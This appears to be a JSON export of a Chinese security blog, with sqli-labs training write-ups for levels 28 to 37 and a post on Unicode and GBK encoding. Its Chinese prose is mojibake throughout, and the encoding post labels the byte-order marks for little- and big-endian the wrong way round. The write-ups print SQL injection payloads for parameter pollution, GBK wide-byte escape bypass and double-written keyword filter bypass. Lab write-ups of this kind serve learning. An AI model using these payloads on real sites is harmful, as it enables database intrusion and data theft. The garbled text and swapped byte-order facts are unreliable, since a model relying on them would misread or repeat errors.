è€Œforeach()å‡½æ•°ä¸»è¦ä½œç”¨å°±æ˜¯éå†æ•°ç»„ï¼Œå°†æ•°ç»„è¢«åˆ†å‰²çš„æ•°ç»„ä¸€ä¸€è¾“å‡ºå‡ºæ¥ã€‚è¿™ä¸ªå‡½æ•°æœ‰ä¸¤ç§è¯­æ³•ï¼š foreach (array_expression as $value):æ¯æ¬¡å¾ªç¯ä¸­ï¼Œå½“å‰å•å…ƒçš„å€¼è¢«èµ‹ç»™ $value å¹¶ä¸”æ•°ç»„å†…éƒ¨çš„æŒ‡é’ˆå‘å‰ç§»ä¸€æ­¥ foreach (array_expression as $key =&gt; $value)ï¼šåŒè¯­å¥ä¸€ï¼ŒåŒæ—¶å½“å‰å•å…ƒçš„é”®ååœ¨æ¯æ¬¡å¾ªç¯ä¸­èµ‹å€¼ç»™$key è¿™ä¸¤ä¸ªè‡ªå®šä¹‰å‡½æ•°çš„æ•ˆæœå°±æ˜¯å°†è¯­å¥ä»â€œ&amp;â€ä¸­åˆ†å‰²å¼€ï¼Œç„¶åå†åˆ†å‰²å¼€çš„æ•°ç»„çš„å‰ä¸¤ä½æ‰¾idå€¼ï¼Œå¦‚æœæ‰¾åˆ°äº†å°±æˆªå–è¿™ä¸ªæ•°ç»„çš„ç¬¬4ä½åˆ°30ä½çš„é•¿åº¦äº¤ç»™preg_match()è¿›è¡Œæ­£åˆ™åŒ¹é…ã€‚ è¿™ç§è¿‡æ»¤å°±å’Œç›¸å½“äºä¸€ä¸ªwafäº†ï¼Œæ˜¯ç›¸å½“å¼ºçš„è¿‡æ»¤ã€‚ä½†æ˜¯ç»“åˆæºç æˆ‘ä»¬å‘ç°ï¼Œtomcatè·å–çš„æ˜¯ç¬¬ä¸€ä¸ªæ•°æ®ï¼Œè€Œå¤„ç†æˆ‘ä»¬æƒ³è¦æ•°æ®çš„apacheè·å–çš„æ˜¯ç¬¬äºŒä¸ªæ•°æ®ã€‚å› æ­¤è¿™é¢˜çš„æ€è·¯å°±æ˜¯æ„å»ºpayloadè®©tomcatå–å¾—ç¬¬ä¸€ä¸ªæ•°æ®ï¼Œè€Œæˆ‘ä»¬çš„æ³¨å…¥çš„è¯­å¥ä»ç¬¬äºŒä¸ªè¯­å¥ä¸­æ³¨å…¥ï¼š?id=1&amp;id=0&#39;union select 1,database(),3 --+ è¿™æ ·è¿™é¢˜å°±è§£å‡ºæ¥äº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è€æµç¨‹äº†ã€‚ less-30åŒå¼•å·æ³¨å…¥ï¼Œless-31åŒå¼•å·åŠ æ‹¬å·æ³¨å…¥ï¼Œè¯­å¥æ„å»ºæ€è·¯ä¸29å…³å®Œå…¨ä¸€è‡´ã€‚ less32-33&amp;36ç›´å¥”32å…³ï¼Œè€è§„çŸ©ä¸Šæºç ï¼š 12345678function check_addslashes($string)&#123; $string = preg_replace(&#x27;/&#x27;. preg_quote(&#x27;\\\\&#x27;) .&#x27;/&#x27;, &quot;\\\\\\\\\\\\&quot;, $string); //escape any backslash $string = preg_replace(&#x27;/\\&#x27;/i&#x27;, &#x27;\\\\\\&#x27;&#x27;, $string); //escape single quote with a backslash $string = preg_replace(&#x27;/\\&quot;/&#x27;, &quot;\\\\\\&quot;&quot;, $string); //escape double quote with a backslash return $string;&#125; ç¬¬ä¸€å¥çš„ä½œç”¨æ˜¯æœç´¢idä¸­çš„å•å¼•å·ä¸åæ–œæ å¹¶ç”¨æ–œæ è¿›è¡Œæ›¿ä»£ï¼Œåé¢ä¸¤å¥çš„ä½œç”¨æ˜¯ä¸ºäº†é˜²æ­¢ä½ å¯¹åæ–œæ è¿›è¡Œæ³¨é‡Šã€‚ è¿™é‡Œä¹Ÿä»‹ç»ä¸€ä¸‹preg_quote()å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°çš„åŠŸèƒ½ä¸ºå‘å…¶ä¸­æ¯ä¸ªæ­£åˆ™è¡¨è¾¾å¼è¯­æ³•ä¸­çš„å­—ç¬¦å‰å¢åŠ ä¸€ä¸ªåæ–œçº¿ï¼Œæ­£åˆ™è¡¨è¾¾å¼ç‰¹æ®Šå­—ç¬¦å¦‚ä¸‹ï¼š. \\ + * ? [ ^ ] $ ( ) &#123; &#125; = ! &lt; &gt; | : - æ¥ç€æ˜¯è¿™å¥ä»£ç ï¼šmysql_query(&quot;SET NAMES gbk&quot;);é€šè¿‡è¿™å¥è¯­å¥ç¨‹åºå¯¹å¯¹$con1è¿›è¡Œgbkç¼–ç ï¼Œå…³äºç¼–ç çš„å†…å®¹åœ¨æˆ‘çš„ä¸Šä¸€ç¯‡åšå®¢è¿›è¡Œäº†ä»‹ç»ï¼Œå¯ä¾›å‚è€ƒï¼šå­¦ä¹ è§£æUnicodeä¸gbkç¼–ç  æˆ‘ä»¬çŸ¥é“gbkç¼–ç ä¸­è‹±æ–‡åŠç¬¦å·ç­‰éƒ½æ˜¯ä¸¤ä¸ªå­—ç¬¦ï¼Œå› æ­¤æˆ‘ä»¬æ„å»ºpayloadæ—¶å¯ä»¥ä½¿ç”¨%aaæˆ–è€…%dfå°†åæ–œæ ç»™åæ‰ã€‚è¿™é‡Œåˆ†æåŸç†ï¼š&#39;URLç¼–ç ä¸º%5c%27ï¼Œåœ¨å‰é¢åŠ ä¸Šä¸€ä¸ª%aaï¼Œå°±æ„æˆäº†%aa%5c%27ï¼Œåœ¨è¿›è¡Œgbkç¼–ç åå°†ä¸¤ä¸ªå­—èŠ‚å½“æˆäº†ä¸€ä¸ªæ±‰å­—ï¼Œæ­¤æ—¶%27å°±è¢«ç‹¬ç«‹äº†å‡ºæ¥ï¼Œå› æ­¤å•å¼•å·å°±è¢«æˆåŠŸæ³¨å…¥è¿›å»äº†ã€‚ äº†è§£äº†åŸç†ï¼Œæˆ‘ä»¬å°±èƒ½è¿›è¡Œpayloadæ„å»ºäº†ï¼š?id=-1%df&#39;union select 1,database(),3 --+ æœ€åæ„‰å¿«çˆ†åº“ï¼Œä¸è¿‡è¦æ³¨æ„ï¼Œç”±äºå•å¼•å·è¢«è¿‡æ»¤ï¼Œå› æ­¤åœ¨çˆ†è¡¨ç­‰æ“ä½œæ—¶è®°å¾—å°†â€™securityâ€™è¿›è¡Œåå…­è¿›åˆ¶ç¼–ç æ¥ç»•è¿‡è¿‡æ»¤ã€‚ less-33ä¸32å…³çš„åŒºåˆ«åœ¨äºè¿™å…³ä½¿ç”¨äº†addslashes()å‡½æ•°è¿›è¡Œè¿‡æ»¤æ“ä½œï¼Œè€Œä¸Šå…³æ˜¯preg_quote()ï¼Œæ„å»ºpayloadæ€è·¯ä¸32å…³ä¸€è‡´ã€‚è€Œless-36åˆ™æ˜¯ä½¿ç”¨äº†mysql_real_escape_string()è¿›è¡Œè¿‡æ»¤ï¼Œæœ¬è´¨ä¸Šéƒ½æ²¡ä»€ä¹ˆå·®åˆ«ã€‚ less-34&amp;37è¿™ä¸¤å…³è§£æ³•ä¸€è‡´ä¸€èµ·å†™äº†ã€‚è¿™å…³æ˜¯POSTæ³¨å…¥ï¼Œburp suiteç›´æ¥æ‹‰å‡ºæ¥ç”¨ã€‚æœ‰äººä¼šé—®ä¸ºä»€ä¹ˆä¸ç”¨hackbarå‘¢ï¼Œæˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹ï¼š é¦–å…ˆè¿™é¢˜ä¾ç„¶æ˜¯å®½å­—ç¬¦æ³¨å…¥ï¼Œå› æ­¤æˆ‘ä»¬æ„å»ºpayloadï¼šuname=admin%a0&#39;union select 1,database(),#&amp;passwd=1&amp;submit=Submitæˆ‘ä»¬å‘ç°ç™»å½•å¤±è´¥äº†ï¼Œè¿™æ˜¯æ€ä¹ˆå›äº‹å‘¢ï¼Œæˆ‘ä»¬æŠ“åŒ…æ¥çœ‹çœ‹ï¼šuname=admin%25a0%27union+select+1%2Cdatabase%28%29%2C+%23&amp;passwd=1&amp;submit=Submit adminä¸a0ä¹‹é—´å¤šå‡ºäº†ä¸€ä¸ª%25ï¼Œè¿™æ˜¯å› ä¸ºåœ¨POSTä¸Šä¼ æ•°æ®æ—¶ï¼ŒåŸæ¥%a0å‰çš„é‚£ä¸ªâ€œ%â€è¢«URLç¼–ç æˆ%25ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦å°†è¿™ä¸ª25åˆ æ‰å°±è¡Œäº†ï¼Œå½“ç„¶åœ¨Requsetä¸­ç›´æ¥è¿›è¡Œæ³¨å…¥ä¹Ÿæ˜¯å¯ä»¥çš„ï¼š åŒæ ·è®°å¾—åœ¨çˆ†è¡¨ç­‰æ“ä½œæ—¶è®°å¾—ç¼–ç ï¼ŒåŒ32å…³ä¸€æ ·ï¼Œç›²æ³¨å’ŒæŠ¥é”™æ³¨å…¥åŒæ ·å¯ä»¥æ“ä½œã€‚ è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªæ–¹æ³•ï¼Œï¿½æ³•ï¼Œç›´æ¥ä¸Šæ•ˆæœï¼š è€Œ37å…³åŒºåˆ«åªæ˜¯ä½¿ç”¨äº†mysql_real_escape_string()å‡½æ•°è¿›è¡Œè¿‡æ»¤ã€‚ less-35è¿™å…³æœ€æœ‰æ„æ€ï¼Œè½¬ä¹‰äº†å¼•å·ï¼Œç»“æœæºç çš„æŸ¥è¯¢è¯­å¥æ²¡åŠ å¼•å·ï¼š$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;; é‚£è¿™é¢˜å°±ä¸æ˜¯å­—ç¬¦å‹æ³¨å…¥äº†ï¼Œè€Œæ˜¯æ•°å€¼å‹æ³¨å…¥ï¼Œå› æ­¤æˆ‘ä»¬ç›´æ¥æ„å»ºpayloadï¼Œè®°å¾—ç¼–ç ç»•è¿‡è¿‡æ»¤ã€‚è¿™é“é¢˜åªèƒ½è¯´å›å½’åˆå¿ƒäº†ã€‚","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -mysql","slug":"web-mysql","permalink":"http://example.com/tags/web-mysql/"}]},{"title":"å­¦ä¹ è§£æUnicodeä¸gbkç¼–ç ","slug":"å­¦ä¹ è§£æUnicodeä¸gbkç¼–ç ","date":"2021-10-25T02:56:38.000Z","updated":"2022-01-14T06:15:23.189Z","comments":true,"path":"2021/10/25/å­¦ä¹ è§£æUnicodeä¸gbkç¼–ç /","link":"","permalink":"http://example.com/2021/10/25/%E5%AD%A6%E4%B9%A0%E8%A7%A3%E6%9E%90Unicode%E4%B8%8Egbk%E7%BC%96%E7%A0%81/","excerpt":"å‰è¨€åœ¨åšsqli-labsçš„less-32åŠåå‡ å…³æ—¶æ¥è§¦åˆ°äº†å®½å­—èŠ‚æ³¨å…¥ï¼Œå°±å­¦ä¹ äº†ä»¥ä¸Šå››ç§ç¼–ç æ–¹å¼å¹¶ä¸”è¿›è¡Œäº†è¾¨æï¼Œé€šè¿‡è¿™ç¯‡åšå®¢ä»¥è®°å½•ä¸‹æ¥ã€‚","text":"å‰è¨€åœ¨åšsqli-labsçš„less-32åŠåå‡ å…³æ—¶æ¥è§¦åˆ°äº†å®½å­—èŠ‚æ³¨å…¥ï¼Œå°±å­¦ä¹ äº†ä»¥ä¸Šå››ç§ç¼–ç æ–¹å¼å¹¶ä¸”è¿›è¡Œäº†è¾¨æï¼Œé€šè¿‡è¿™ç¯‡åšå®¢ä»¥è®°å½•ä¸‹æ¥ã€‚ ä»asciiå¼€å§‹æˆ‘ä»¬éƒ½çŸ¥é“è®¡ç®—æœºåªèƒ½è¯†åˆ«0å’Œ1çš„äºŒè¿›åˆ¶è¯­è¨€ï¼Œå› æ­¤å½“æˆ‘ä»¬æƒ³è¦è¡¨ç¤ºå­—æ¯æˆ–è€…æ•°å­—æ—¶éœ€è¦ä¸€ä¸ªè§„åˆ™è¿›è¡Œè½¬æ¢ï¼Œå› æ­¤æˆ‘ä»¬æœ‰äº†asciiå­—ç¬¦é›†ã€‚ä½†æ˜¯asciiåªç”¨äº†7bitsæ¥è¡¨ç¤ºå­—ç¬¦ï¼Œåæ¥ç»è¿‡è¡¥å……ç”¨8bitsï¼Œè¿™å¯¹è‹±æ–‡æ¥è¯´è¶³å¤Ÿäº†ï¼Œå¯æ˜¯ä¸–ç•Œä¸Šè¿˜æœ‰åƒåƒä¸‡ä¸‡ä¸ªå…¶ä»–æ–‡å­—ï¼Œ1ä¸ªå­—èŠ‚æ˜¾ç„¶æ˜¯ä¸å¤Ÿçš„ï¼Œå› æ­¤ï¼Œå®½å­—ç¬¦å°±å‡ºç°äº†ã€‚ Unicodeå°±èµ·åˆ°äº†è¡¥å……ä½œç”¨ï¼Œäº‹å®ä¸Šï¼ŒUnicodeå¯¹è®¡ç®—æœºå…¨çƒåŒ–å‘å±•èµ·åˆ°äº†å·¨å¤§ä½œç”¨ã€‚å› ä¸ºå„ä¸ªå›½å®¶ä¹‹é—´éƒ½æ¨å‡ºäº†å„è‡ªçš„ç¼–ç æ ‡å‡†ï¼Œè¿™äº›æ ‡å‡†æ²¡æœ‰ä¸€ä¸ªç»Ÿä¸€å€¼ï¼Œä¾‹å¦‚gbkå°±æ˜¯ä¸­å›½æ ‡å‡†ï¼Œåªåœ¨ä¸­å›½ä½¿ç”¨ï¼Œè€ŒUnicodeæŠŠå…¨çƒæ‰€æœ‰è¯­è¨€ç»Ÿä¸€åˆ°äº†ä¸€ä¸ªç¼–ç é‡Œã€‚ Unicodeä¸UTF-8&amp;16Unicodeï¼ˆUCS-2ï¼‰ç¼–ç éµå¾ªç€ä¸­è‹±æ–‡åŠå…¶ç¬¦å·å…¨éƒ¨å ç”¨2ä¸ªå­—èŠ‚ï¼Œå¦‚æœæ˜¯ä¸€ä¸ªè‹±æ–‡å­—æ¯ï¼Œå…¶äºŒè¿›åˆ¶è¡¨è¾¾ä¸ºï¼ˆä»¥sä¸ºä¾‹ï¼‰ï¼š00000000 01110011è€Œä¸€ä¸ªæ±‰å­—çš„äºŒè¿›åˆ¶è¡¨è¾¾å¼ä¸ºï¼ˆä»¥â€œæ—¥â€å­—ä¸ºä¾‹ï¼‰ï¼š01100101 11100101 åœ¨Unicodeå­—ç¬¦é›†ä¸­ï¼Œä¸€ä¸ªå­—ç¬¦å¯¹åº”çš„ä¸€ä¸ªåå…­è¿›åˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°è‹±æ–‡çš„äºŒè¿›åˆ¶ç å‰9ä½å…¨éƒ¨éƒ½æ˜¯0ï¼Œå æ®ä¸¤ä¸ªå­—èŠ‚å®åœ¨æ˜¯ä¸€ç§æµªè´¹ï¼Œè¿™æ—¶å€™UTFå°±æ´¾ä¸Šç”¨åœºäº†ã€‚ é¦–å…ˆæ˜¯UTF-8,å¯¹äºè‹±æ–‡å­—æ¯è¿™ç±»å•å­—èŠ‚å­—ç¬¦ï¼ŒUTF-8ä¼šå°†å­—èŠ‚ç¬¬ä¸€ä½è®¾ç½®ä¸º0ï¼Œæ­¤æ—¶è¿™ä¸ªç¬¬ä¸€ä¸ª0ç›¸å½“äºä»£æ›¿äº†9ä¸ª0ï¼Œå› æ­¤è‹±æ–‡å­—ç¬¦è¿™ç±»çš„å­—ç¬¦åªå ç”¨ä¸€ä¸ªå­—èŠ‚ï¼Œä¸asciiç å€¼å®Œå…¨ç›¸åŒã€‚ è€Œå¯¹äºå¤šä¸ªå­—èŠ‚çš„å­—ç¬¦ï¼Œå°±è¦è½¬æ¢ä¸ºå¤šå­—èŠ‚çš„UTF-8ï¼Œè€Œä¸­æ–‡åœ¨UTF-8ä¸­å±äºä¸‰å­—èŠ‚ã€‚UTF-8å¯¹äºnä¸ªå­—èŠ‚çš„ç¼–ç æ–¹å¼ä¸ºï¼Œç¬¬ä¸€ä¸ªå­—èŠ‚çš„å‰nä½ç”¨1è¡¨ç¤ºï¼Œç¬¬n+1ä½ç”¨0è¡¨ç¤ºï¼Œåé¢å­—èŠ‚çš„å‰ä¸¤ä½ç”¨10è¡¨ç¤ºã€‚ é‚£ä¹ˆsä¸æ—¥çš„UTF-8ç¼–ç å°±æ˜¯å¦‚ä¸‹æ‰€ç¤ºï¼šs:01110011æ—¥ï¼š11100110 10010111 10100101 æ˜¯çš„ï¼Œæ±‰å­—åœ¨UTF-8ä¸­å æ®äº†3ä¸ªå­—ç¬¦ï¼Œè¿™å°±å¯¼è‡´äº†åœ¨ä½¿ç”¨çº¯ä¸­æ–‡æ—¶åè€Œæ¶ˆè€—äº†æ›´å¤šçš„å†…å­˜ï¼Œå› æ­¤å¯¹äºçº¯ä¸­æ–‡UTF-8ä¸æ˜¯å¾ˆå‹å¥½ã€‚è¿™æ—¶ï¼Œæˆ‘ä»¬æŠŠç›®å…‰èšç„¦åœ¨UTF-16ã€‚ UTF-16çš„ç¼–ç ä¸­å­—ç¬¦ä¸€èˆ¬å ä¸¤ä¸ªå­—èŠ‚ï¼Œå› æ­¤æœ‰äº›äººä¼šå°†Unicodeå’ŒUTF-16çš„æ¦‚å¿µæ··ä½œä¸€è°ˆï¼Œè¿™æ˜¯é”™è¯¯çš„ã€‚ä½†å…¶å®UTF-16ç¼–ç çš„æ³›ç”¨æ€§è¿˜æ˜¯æ²¡æœ‰UTF-8å¹¿ï¼Œå› ä¸ºUTF-16å­˜åœ¨å¤§å°ç«¯å­—èŠ‚åºé—®é¢˜ï¼Œå®¹é”™ç‡ä¹Ÿæ›´ä½ã€‚åè§‚UTF-8å±€éƒ¨çš„å­—èŠ‚é”™è¯¯ï¼ˆä¸¢å¤±ã€å¢åŠ ã€æ”¹å˜ï¼‰ä¸ä¼šå¯¼è‡´è¿é”æ€§çš„é”™è¯¯ï¼Œå› ä¸ºUTF-8 çš„å­—ç¬¦è¾¹ç•Œå¾ˆå®¹æ˜“æ£€æµ‹å‡ºæ¥ã€‚è€Œurlç¼–ç å°±æ˜¯åœ¨uft-8ç¼–ç çš„åŸºç¡€ä¸Šï¼Œç»™ç¼–ç çš„æ¯ä¸ªå­—èŠ‚åŠ ä¸Šç™¾åˆ†å·ã€‚ è¿™é‡Œç»™å‡ºä¸åŒç¼–ç æ–¹å¼çš„æ–‡ä»¶å¤´ï¼š 12345EF BB BF UTF-8FE FF UTF-16/UCS-2, little endianFF FE UTF-16/UCS-2, big endianFF FE 00 00 UTF-32/UCS-4, little endian.00 00 FE FF UTF-32/UCS-4, big-endian. èµ°è¿‘gbkåœ¨äº†è§£gbkä¹‹å‰ï¼Œæˆ‘ä»¬è¦å…ˆäº†è§£GB2312ï¼Œè€Œåœ¨äº†è§£GB2312ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆè®¤è¯†ä¸‹åŒºä½ç ã€‚åŒºä½ç æ˜¯1980å¹´ä¸­å›½åˆ¶å®šçš„ç¼–ç æ ‡å‡†ï¼Œæ¯ä¸€ä¸ªå­—ç¬¦éƒ½æœ‰ä¸€ä¸ªå¯¹åº”çš„å››ä½ç¼–å·ï¼Œå‰ä¸¤ä½ä¸ºâ€œåŒºâ€ï¼Œåä¸¤ä½ä¸ºâ€œä½â€ï¼Œè€Œä¸­æ–‡æ±‰å­—çš„åŒºç ä¸º16ã€‚ GB2312ç¼–ç æ­£æ˜¯åŸºäºåŒºä½ç ç”¨åŒå­—èŠ‚ç¼–ç è¡¨ç¤ºä¸­æ–‡çš„ï¼Œç¼–ç æ–¹å¼ä¸€èˆ¬ä¸º0xA0+åŒºå· 0xA0+ä½å·ã€‚è€Œå½“ç¼–ç å¯¹è±¡æ˜¯è‹±æ–‡æˆ–æ•°å­—æ—¶ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ç›´æ¥ä½¿ç”¨asciiç¼–ç ã€‚ä¸è¿‡è¿™é‡Œæœ‰ä¸ªæœ‰æ„æ€çš„æƒ…å†µï¼š 120x320xA3 0xB2 0x32è‡ªç„¶æ˜¯ä»£è¡¨ç€2ï¼Œé‚£ä¹ˆä¸‹é¢é‚£ä¸ªæ ¹æ®GB2312ç¼–ç çš„ç»“æœåº”è¯¥ä¹Ÿä¸º2ï¼Œè¿™ä¸¤ä¸ª2æœ‰ä»€ä¹ˆåŒºåˆ«å‘¢ï¼Ÿæœ‰ï¼Œasciiç å¯¹åº”çš„2æ˜¯åŠè§’å­—ç¬¦ï¼Œè€ŒGB2312ç¼–ç çš„2æ˜¯å…¨è§’å­—ç¬¦ã€‚ è€Œgbkï¼Œå³æ±‰å­—å›½é™…æ‰©å±•ç ï¼Œåœ¨GB2312çš„åŸºç¡€ä¸Šè¿›è¡Œäº†æ‹“å±•ï¼Œæ¶µç›–äº†Unicodeä¸­æ‰€æœ‰çš„æ±‰å­—ï¼Œå› æ­¤ä¹Ÿå¯ä»¥Unicodeä¸€ä¸€å¯¹åº”ã€‚å’Œå‰é¢è¯´åˆ°çš„GB2312ä¸åŒï¼Œæœ‰çš„å­—çš„ç¼–ç æ¯”0xA0 0xA0è¿˜å°ï¼Œä½†æ˜¯å…¶å®åªè¡¥å……äº†è®¡ç®—æœºç¼–ç è¡¨ï¼ŒåŒºä½ç æ˜¯æ²¡æœ‰æ›´æ–°çš„ã€‚å¾®è½¯Windowså®‰æ’ç»™GBKçš„code pageï¼ˆä»£ç é¡µï¼‰æ˜¯CP936ï¼Œæ‰€ä»¥æœ‰æ—¶å€™çœ‹åˆ°ç¼–ç æ ¼å¼æ˜¯CP936ï¼Œå…¶å®å°±æ˜¯GBKçš„æ„æ€ã€‚ åŒä¸€ä¸ªç¼–ç æ–‡ä»¶é‡Œï¼Œé«˜å­—èŠ‚æœ€é«˜ä½ä¸º0åˆ™ä¸ºasciiï¼Œä¸º1åˆ™ä¸ºä¸­æ–‡ã€‚ æ€»ç»“å­¦ä¹ è¿™äº›ç¼–ç çš„åŸç†ï¼Œå¯¹äºæˆ‘ä»¬ç»§ç»­è¿›è¡Œçš„é¶åœºç»ƒä¹ å¯ä»¥æä¾›ä¸€å®šçš„å¸®åŠ©ï¼Œäº†è§£åˆ°è®¡ç®—æœºæ˜¯å¦‚ä½•ç¼–ç æˆ‘ä»¬çš„æ–‡å­—çš„ï¼Œä¸è¿‡è¿™ä¹Ÿç®—ä¸é¡¾æ­£ä¸šä¸€å›äº†å§ã€‚","categories":[{"name":"other","slug":"other","permalink":"http://example.com/categories/other/"}],"tags":[{"name":"-ç¼–ç ","slug":"ç¼–ç ","permalink":"http://example.com/tags/%E7%BC%96%E7%A0%81/"}]},{"title":"sqli-labç»ƒä¹ -less-28åŠç‰¹æ®Šä¸å¯æ‰“å°å­—ç¬¦","slug":"sqli-labç»ƒä¹ -less-28åŠç‰¹æ®Šä¸å¯æ‰“å°å­—ç¬¦","date":"2021-10-23T03:06:28.000Z","updated":"2021-12-01T08:28:35.452Z","comments":true,"path":"2021/10/23/sqli-labç»ƒä¹ -less-28åŠç‰¹æ®Šä¸å¯æ‰“å°å­—ç¬¦/","link":"","permalink":"http://example.com/2021/10/23/sqli-lab%E7%BB%83%E4%B9%A0-less-28%E5%8F%8A%E7%89%B9%E6%AE%8A%E4%B8%8D%E5%8F%AF%E6%89%93%E5%8D%B0%E5%AD%97%E7%AC%A6/","excerpt":"å‰è¨€ä¸“é—¨æŠŠç¬¬28å…³å•æ‹¿å‡ºæ¥,æ˜¯å› ä¸ºåœ¨åšé¢˜æ—¶é‡åˆ°äº†ä¸€äº›é—®é¢˜ï¼Œå°±æ‹¿å‡ºæ¥å•å†™ä¸€ç¯‡åšå®¢ã€‚ps.æ•´ç†äº†å…³äºsqli-labsé¶åœºçš„åšå®¢ï¼Œå°†åˆ†æ•£çš„å‡ ç¯‡æ•´åˆäº†èµ·æ¥ã€‚","text":"å‰è¨€ä¸“é—¨æŠŠç¬¬28å…³å•æ‹¿å‡ºæ¥,æ˜¯å› ä¸ºåœ¨åšé¢˜æ—¶é‡åˆ°äº†ä¸€äº›é—®é¢˜ï¼Œå°±æ‹¿å‡ºæ¥å•å†™ä¸€ç¯‡åšå®¢ã€‚ps.æ•´ç†äº†å…³äºsqli-labsé¶åœºçš„åšå®¢ï¼Œå°†åˆ†æ•£çš„å‡ ç¯‡æ•´åˆäº†èµ·æ¥ã€‚ less-28å…ˆè®²è§£é¢˜æ€è·¯ã€‚é€šè¿‡æ ‡é¢˜æç¤ºä¸æºç çš„åˆ†æï¼Œæˆ‘ä»¬çŸ¥é“è¿™é¢˜é™¤äº†è¿‡æ»¤æ³¨é‡Šç¬¦ä¸ç©ºæ ¼ä¹‹å¤–ï¼Œè¿˜å°†è¿ç»­çš„union selectç»™è¿‡æ»¤äº†ï¼š 12345678910$id= preg_replace(&#x27;/[\\/\\*]/&#x27;,&quot;&quot;, $id); //strip out /*$id= preg_replace(&#x27;/[--]/&#x27;,&quot;&quot;, $id); //Strip out --.$id= preg_replace(&#x27;/[#]/&#x27;,&quot;&quot;, $id); //Strip out #.$id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id); //Strip out spaces.//$id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id);//Strip out spaces.$id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id) //Strip out spaces.$id= preg_replace(&#x27;/union\\s+select/i&#x27;,&quot;&quot;, $id); //Strip out UNION &amp; SELECT.return $id; è¿‡æ»¤æ˜¯ç›¸å½“ä¸¥æ ¼çš„ï¼Œä¸è¿‡æˆ‘ä»¬å·²ç»å­¦ä¹ äº†è¿™ä¹ˆå¤šæ³¨å…¥æ–¹æ³•ï¼Œæ—¢ç„¶è”åˆæ³¨å…¥è¯­å¥å†…å®¹è¢«è¿‡æ»¤ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç›²æ³¨æ³•æ¥æ³¨å…¥ï¼ˆç”±äºæŠ¥é”™ä¸ä¼šå›æ˜¾å› æ­¤ä¸è€ƒè™‘æŠ¥é”™æ³¨å…¥ï¼‰ã€‚ä½†æ˜¯æˆ‘ä»¬è¦ç»ƒä¹ çš„å°±æ˜¯ç»•è¿‡è¿‡æ»¤çš„æ–¹æ³•ï¼Œå› æ­¤æˆ‘ä»¬ä¾ç„¶é‡‡ç”¨è”åˆæŸ¥è¯¢è¿›è¡Œæ³¨å…¥ã€‚ å…³äºæ³¨é‡Šç¬¦ä¸ç©ºæ ¼çš„ç»•è¿‡ä¸Šç¯‡åšå®¢å·²ç»ä»‹ç»è¿‡äº†ï¼Œè¿™é‡Œæ¥ä»‹ç»å¦‚ä½•ç»•è¿‡å¯¹union selectçš„è¿‡æ»¤ï¼ˆå•å¼•å·+æ‹¬å·æ³¨å…¥ï¼‰ï¼š 123?id=0&#x27;)unionunion%0aselect%0aselect%0a1,database(),3;%00?id=0&#x27;)ununion%0aselection%0aselect%0a1,database(),3;%00 è¿™ç§æ–¹æ³•æ˜¯åŒå†™ç»•è¿‡ï¼Œæˆ‘ä»¬å‘ç°è¾“å…¥åé¡µé¢åœ¨hintéƒ¨åˆ†å›æ˜¾å†…å®¹éƒ½ä¸ºæ­£å¸¸çš„è”åˆæŸ¥è¯¢è¯­å¥ï¼ŒåŸç†éƒ½æ˜¯è®©union%0aselectè¢«è¿‡æ»¤ï¼Œå‰©ä¸‹çš„å†…å®¹åˆšå¥½æ„æˆä¸€ä¸ªæ–°çš„union%0aselectï¼Œä»è€Œè¿›è¡Œè”åˆæŸ¥è¯¢ï¼Œå½“ç„¶è¿™é‡Œçš„%a0å¯ä»¥æ›¿æ¢ä¸ºå…¶ä»–ä¸å¯æ‰“å°å­—ç¬¦ä»£æ›¿ã€‚ åˆ°è¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œçˆ†åº“æ“ä½œäº†ã€‚ å…³äº%a0åˆ†æè¿™é“é¢˜å…¶å®å·²ç»è§£å®Œäº†ï¼Œä½†æ˜¯æˆ‘ä»¬åœ¨å›é¡¾æºç ä¸­å…³äºunion selectçš„è¿‡æ»¤è¯­å¥ï¼š$id= preg_replace(&#39;/union\\s+select/i&#39;,&quot;&quot;, $id); unionçš„åé¢æœ‰ä¸€ä¸ª\\s+ï¼Œè¿™å°±æ„å‘³ç€æ‰€æœ‰çš„ç©ºæ ¼ã€ç©ºç™½ç¬¦ä»¥åŠæ¢è¡Œç¬¦åœ¨è¿™é‡Œå…¨éƒ¨éƒ½è¢«è¿‡æ»¤äº†ï¼Œè€Œè¿™ä¸ªåŠ å·æ„å‘³ç€å¤šæ¬¡åŒ¹é…ï¼Œå› æ­¤æˆ‘ä»¬ä¹Ÿä¸èƒ½é€šè¿‡åŒå†™ç©ºæ ¼çš„æ–¹å¼æ¥ç»•è¿‡ã€‚ä½†åœ¨è¿™å…¶ä¸­ï¼Œæœ‰ä¸€ä¸ªä¾‹å¤–ï¼š%a0 æ³¨æ„åˆ°è¿™ä¸ªç©æ„ä¹Ÿæ˜¯æˆ‘å‘ç°å…¶ä»–äººæ„å»ºäº†ä¸€å¥è¿™æ ·çš„è¯­å¥ï¼š?id=0&#39;)union%a0select(1),(database()),(3);%00 %a0æ˜¯ç»è¿‡URLç¼–ç çš„ä¸å¯æ‰“å°å­—ç¬¦ï¼Œä»£è¡¨çš„æ˜¯ç©ºæ ¼ï¼ŒæŒ‰é“ç†æ¥è¯´æ˜¯åº”è¯¥è¦è¢«è¿‡æ»¤æ‰çš„ï¼Œä½†æ˜¯å±…ç„¶æ²¡æœ‰ï¼Œç›¸å½“ç¥å¥‡ã€‚ä¸è¿‡æˆ‘ä»¬åœ¨linuxä¸‹è·‘php7é¶åœºæ—¶ï¼Œå‘ç°äº†é—®é¢˜ï¼š 